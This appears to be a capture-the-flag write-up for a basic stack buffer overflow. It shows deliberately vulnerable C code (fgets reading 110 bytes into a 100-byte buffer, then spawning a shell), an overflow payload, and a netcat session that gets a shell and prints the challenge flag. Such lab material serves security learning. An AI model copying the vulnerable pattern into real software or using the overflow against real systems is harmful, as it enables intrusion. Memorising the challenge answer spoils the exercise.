This is a basic buffer overflow without a complex payload. By analyzing the source code we can see several things : 

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
// gcc -fno-stack-protector -o dnb1 main.c

void menu() {
   puts("                                   |\\__/,|   (`\\");
   puts("~ Test annuel de chatonnerie ~     |_ _  |.--.) )");
   puts("    ~ êtes-vous un chat ? ~        ( T   )     /");
   puts("                                  (((^_(((/(((_/");
}

int main(void) {
   setvbuf(stdin, NULL, _IONBF, 0);
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);
   char identite[8] = "chien";
   char buffer[100];

   menu();
   printf("         >>> ");
   fgets(buffer, 110, stdin);

   if (strcmp(identite, "chat\n") == 0) {
      puts("bienvenue par minou !");
      system("/bin/sh");
   }
   else {
      puts("toutou détecté !");
   }
   return 0;
}
```

The `buffer` and the `identite` variables seems to be the only variables here thus they could be concomitant.  Since the buffer is 100 characters long but the `fgets` statement reads 110 characters the payload looks like this : 

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAchat
```

```
nc challenges.hackademint.org 32444
                                   |\__/,|   (`\
~ Test annuel de chatonnerie ~     |_ _  |.--.) )
    ~ êtes-vous un chat ? ~        ( T   )     /
                                  (((^_(((/(((_/
         >>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAchat
bienvenue par minou !
ls
dnb1
flag.txt
cat flag.txt
Star{pwn3z_m0i_ç4}
```
